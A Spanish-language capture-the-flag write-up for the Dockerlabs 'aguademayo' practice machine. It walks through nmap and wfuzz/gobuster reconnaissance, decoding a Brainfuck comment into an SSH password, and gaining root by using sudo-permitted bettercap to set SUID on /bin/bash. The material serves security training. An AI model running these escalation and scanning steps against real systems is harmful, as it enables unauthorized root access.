#Dockerlabs #WriteUps 


>[!NOTE] Habilidades
> Brainfuck Decode, SUID Privilege Escalation

## Lanzar el laboratorio

Para desplegar el laboratorio de `docker` que estaremos explotando, ejecutaremos los siguientes comandos

~~~ bash
# Descomprimimos el archivo
unzip aguademayo.tar

# Asignamos permisos de ejecución al script que despliega el laboratorio
chmod +x auto_deploy.sh

# si no tienes el comando service
systemctl start docker

# Lanzamos el laboratorio
./auto_deploy.sh aguademayo.tar
~~~




# Reconocimiento
---
## Ping

Comprobamos que la máquina se encuentre activa en la `172.17.0.2`, por comodidad, agregaré esta dirección al archivo `/etc/hosts` con el nombre `aguademayo.local`

![etc hosts](https://github.com/user-attachments/assets/fb3f2cc0-7c79-4b85-816d-6fb300a34683)

~~~ bash
ping -c1 aguademayo.local
~~~


## Nmap

Haremos un primer escaneo por el protocolo TCP para descubrir si la máquina tiene puertos abiertos, lo haremos con `nmap` empleando el siguiente comando

~~~ bash
nmap --open -p- --min-rate 5000 -n -sS -v -Pn aguademayo.local -oG allPorts
~~~

![first_nmap_scan](https://github.com/user-attachments/assets/eeca9c92-c8fe-4930-96d0-bb5388ecfd46)

- `--open`: Mostrar solamente los puertos abiertos
- `-p-`: Escanear todo el rango de puertos (65535)
- `-sS`: Modo de escaneo TCP SYN, usa una técnica más sigilosa para determinar que el puerto está abierto al no concluir la conexión
- `-n`: No aplicar resolución DNS, lo que acelera el escaneo
- `-Pn`: Deshabilitar el descubrimiento de host, o sea, asume que el objetivo se encuentra activo, por lo que no hace un `ping` previo a `aguademayo.local`
- `-v`: Modo `verbose`, muestra los resultados del escaneo en tiempo real
- `-oG`: Exportar el escaneo a un formato `Grepable`, lo que es más útil a la hora de extraer información de nuestro archivo, como por ejemplo, los puertos abiertos encontrados
- `--min-rate 5000`: Enviar mínimo 5000 paquetes por segundo

### Services Scan

~~~ bash
nmap -sVC -p 22,80 aguademayo.local -oN targeted
~~~

![ports_scan](https://github.com/user-attachments/assets/ef3499c3-2ee6-468b-9caf-7a2606f57803)

- `-sV`: Detectar la versión del servicio que se está ejecutando
- `-sC`: Emplear scripts básicos de reconocimiento
- `-oN`: Exportar a formato nmap (igual que en consola)

## Http Service

Vemos el puerto `80` que corresponde a un servicio `http`, veamos que hay en él. Podemos usar la herramienta `whatweb` para listar las tecnologías detectadas en el servidor

~~~ bash
whatweb http://172.17.0.2
~~~

![web](https://github.com/user-attachments/assets/e79f9f4c-bd5b-4818-8584-6e25d3e16da3)


## Fuzzing

Lo siguiente que haremos será intentar descubrir posibles directorios existentes en este servicio web, en este caso podemos usar cualquier herramienta de fuzzing, usaré `wfuzz` y `gobuster`
### Wfuzz

~~~ bash
wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://aguademayo.local/FUZZ
~~~

![wfuzz_fuzzing](https://github.com/user-attachments/assets/f56896fd-425d-4661-b3d6-9d445ec23945)


- `-c`: Formato colorizado
- `--hc=404`: Ocultar el código de estado 404 (No encontrado)
- `-w`: Especificar un diccionario de palabras
- `-t 200`: Dividir el proceso en 200 hilos, agilizando la tarea

### Gobuster

~~~ bash
gobuster dir -u http://aguademayo.local -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
~~~

![gobuster fuzzing](https://github.com/user-attachments/assets/f99cd25b-c598-4142-907f-88b8ecf061cb)


- `dir`: Modo de descubrimiento de directorios y archivos
- `-u`: Dirección URL
- `-w`: Diccionario a usar
- `-t 200`: Establecer 200 subprocesos 

Podemos ver que en ambos casos se ha descubierto el directorio `images`, vamos a ver que contiene con `firefox`, o si no te gusta abandonar la terminal, con `curl`

~~~ bash
curl -sL -X GET http://172.17.0.2/images
~~~

![curl a images](https://github.com/user-attachments/assets/39227c4b-655d-457c-88fc-08a8dd73497a)


- `-s`: No mostrar progreso o error de la solicitud
- `-L`: Habilitar el redireccionamiento
- `-X`: Especificar el método HTTP a usar

![dir images](https://github.com/user-attachments/assets/34017a47-e83a-412d-b68a-841aef037e47)


Vemos un archivo  `agua_ssh.jpg`, procedemos a traerla a nuestra máquina y ver de qué se trata

![imagen_ssh](https://github.com/user-attachments/assets/c53c3bc9-8500-410d-966c-e873e3fa3c32)


~~~ bash
wget http://aguademayo.local/images/agua_ssh.jpg
~~~

![wget agua_ssh](https://github.com/user-attachments/assets/849b469f-4eb1-465e-8533-4142cc4e4d3c)


El nombre del archivo `agua_ssh.jpg` me parece un tanto raro, ya que contiene `ssh` en el nombre, esto me hace creer que `agua` es un usuario válido en la máquina.

Si hacemos un análisis del archivo o imprimimos los caracteres de la imagen, no encontramos mayores pistas

## Exiftool Analysis

~~~ bash
exiftool agua_ssh.jpg
~~~

![exiftool_analysis](https://github.com/user-attachments/assets/2dd17cf9-b7c1-4ff8-a42e-a1e0c0555a66)


## Strings

~~~ bash
strings agua_ssh.jpg
~~~

![listar caracteres](https://github.com/user-attachments/assets/c644fe6b-464c-43a1-aad2-bb3202585080)



# Intrusión
---
## Brainfuck Decode

Si vemos el código fuente podemos ver algo inusual al final del todo en un comentario HTML

![web codigo raro](https://github.com/user-attachments/assets/6cc305c9-409d-4a0b-b918-8db1a54a4790)


Como no sabía a qué me enfrentaba, lo primero que hice fue buscar este comentario HTML en Google

![decode ](https://github.com/user-attachments/assets/284b19e4-8fba-4ebf-89be-53633f64c2f8)


Podemos ver que hay un mensaje escrito en lenguaje Brainfuck, así que lo decodificaremos con ayuda de esta web `https://dcode.fr/brainfuck-language`
**No olvidemos quitar los caracteres del comentario HTML** (`<!--` y `-->`)

![decrypt](https://github.com/user-attachments/assets/d7b04ba9-92eb-45d6-a17c-9259ab531f46)


Vemos que el mensaje escondido se trata de la palabra `bebeaguaqueessano`, quizá sea la contraseña del usuario `agua`, por lo que probamos conectarnos por `ssh`

~~~ bash
ssh agua@aguademayo.local
~~~

![entramos por ssh](https://github.com/user-attachments/assets/2a97e6e5-bb5c-491d-a8b3-77772138fd4b)




# Escalada de privilegios
---
## Tratamiento TTY

Una vez tenemos acceso, haremos un tratamiento de la TTY para limpiar la pantalla con `Ctrl + L`, para esto cambiaremos el valor de la variable `$TERM`

~~~ bash
export TERM=xterm
~~~

## Sudoers

Primeramente veremos si tenemos privilegios `sudo` con el siguiente comando

~~~ bash
sudo -l
~~~

![sudo -l](https://github.com/user-attachments/assets/e195eee4-918e-4e28-9e0a-a0e8e7f1d7be)


- `-l`: Enumerar los comandos permitidos (o prohibidos) invocables por el usuario en la máquina actual


Existe `bettercap` en la máquina y podemos ejecutarlo sin proporcionar contraseña, ejecutaremos el binario

~~~ bash
sudo bettercap
~~~

![exec bettercap with sudo](https://github.com/user-attachments/assets/80374f74-2a83-4a8d-872b-c8999c1e9ef0)

Veamos el panel de ayuda con el comando `help`

![bettercap help](https://github.com/user-attachments/assets/0c72cce7-e475-40cf-af6a-3028d3eb0c25)


![help bettercap](https://github.com/user-attachments/assets/d204ade0-6a3f-4ac8-8616-fc166c29da05)



## SUID Privilege Escalation

Esta opción (`!`) nos permite ejecutar un comando a nivel de sistema, así que podemos asignar el privilegio SUID a la `bash` para ejecutarla como `root`, para eso, lo haremos con el comando `chmod`, dentro de la consola interactiva de `bettercap` ejecutamos el siguiente comando

~~~ bash
! chmod u+s /bin/bash
~~~

También podemos hacer esto con un solo comando con la opción `-eval` 

~~~ bash
sudo bettercap -eval "! chmod u+s /bin/bash"
~~~

![cambiar el privilegio onliner](https://github.com/user-attachments/assets/d922cf32-64d6-4ea9-b48d-259ee143f131)


- `-eval`: Ejecutar un comando en la máquina


## Root time

Ahora supuestamente asignamos la capacidad de ejecutar `bash` como el usuario `root`, lo podemos verificar con el comando `ls -l /bin/bash` para listar los permisos.

![bash permisions](https://github.com/user-attachments/assets/6089c6ea-08a2-40b0-9950-4bbc5cdcbca6)

Así que ejecutamos `bash` como el propietario, y nos convertimos en el usuario `root`

~~~ bash
bash -p
~~~

- `-p`: Ejecutar como el usuario original

![bash como root](https://github.com/user-attachments/assets/e5fd378a-0105-4ae2-a461-0a4fc680db89)


